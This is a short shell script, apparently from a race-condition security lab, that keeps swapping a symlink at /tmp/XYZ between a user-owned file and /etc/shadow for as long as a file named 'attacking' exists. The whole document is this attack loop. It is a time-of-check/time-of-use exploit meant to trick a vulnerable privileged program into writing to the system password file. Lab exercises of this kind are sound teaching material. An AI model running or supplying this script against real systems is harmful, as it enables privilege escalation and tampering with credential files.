#!/bin/sh

while [ -e attacking ]
do
        ln -s /tmp/UserOwnerFile /tmp/XYZ
        rm -f /tmp/XYZ
        ln -s /etc/shadow /tmp/XYZ
        rm -f /tmp/XYZ
done
